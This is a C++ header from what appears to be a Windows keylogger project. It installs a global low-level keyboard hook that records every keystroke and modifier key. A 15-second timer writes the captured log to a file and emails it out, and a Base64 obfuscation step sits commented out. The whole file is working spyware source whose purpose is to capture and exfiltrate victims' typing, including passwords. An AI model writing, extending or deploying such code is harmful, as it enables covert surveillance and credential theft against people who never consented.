#ifndef _KEYBOARD_HOOK
#define _KEYBOARD_HOOK

#include<fstream>
#include<string>
#include<Windows.h>
#include"KeyConstants.h"
#include"Timer.h"
#include"Send Mail.h"
#include"IO.h"

std::string key_log{};
Base64::Encryption encryption;

void timer_send_mail(void)
{
	if (key_log.empty())
		return;

	std::string last_file{ IO::write_log(key_log) };

	if (last_file.empty())
	{
		Helper::write_app_log("File creation was no succesful. KeyLog '" + key_log + "'");
		return;
	}

	int debug_code = Mail::send_mail("Log [" + last_file + "]",
									/*encryption.encode(key_log)*/key_log,
									IO::get_our_path(true) + last_file);

	if (debug_code != 0)
		Helper::write_app_log("Mail was not sent! Errpr code : " + std::to_string(debug_code));
	else
		key_log.clear();
}

Timer mail_timer(timer_send_mail, 15 * 1000, Timer::Infinite);

HHOOK e_hook = NULL;

//按下按鍵時 作業系統要執行的程式 判斷是哪個按鍵 並記錄到string中
LRESULT our_keyboard_proc(int ncode, WPARAM wparam, LPARAM lparam)
{
	if (ncode < 0)
		CallNextHookEx(e_hook, ncode, wparam, lparam);

	KBDLLHOOKSTRUCT *kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		key_log += Keys::keys[kbs->vkCode].name;

		if (kbs->vkCode == VK_RETURN)
			key_log += "\n";
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;

		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
			key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT ||
			key == VK_MENU || key == VK_LMENU || key == VK_RMENU ||
			key == VK_CAPITAL || key == VK_NUMLOCK ||
			key == VK_LWIN || key == VK_RWIN)
		{
			std::string key_name = Keys::keys[kbs->vkCode].name;

			key_name.insert(1, "/");
			key_log += key_name;
		}
	}

	return CallNextHookEx(e_hook, ncode, wparam, lparam);
}

//安裝或註冊自己的hook
bool install_hook(void)
{
	Helper::write_app_log("Hook started... Timer started");
	mail_timer.start(true);

	e_hook = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(our_keyboard_proc), GetModuleHandle(NULL), 0);

	return e_hook == NULL;
}

//取消自己的hook
bool uninstall_hook(void)
{
	BOOL b = UnhookWindowsHookEx(e_hook);
	e_hook = NULL;
	return static_cast<bool>(b);
}

bool is_hooked(void)
{
	return e_hook == NULL;
}
#endif // !_KEY_BOARD_HOOK
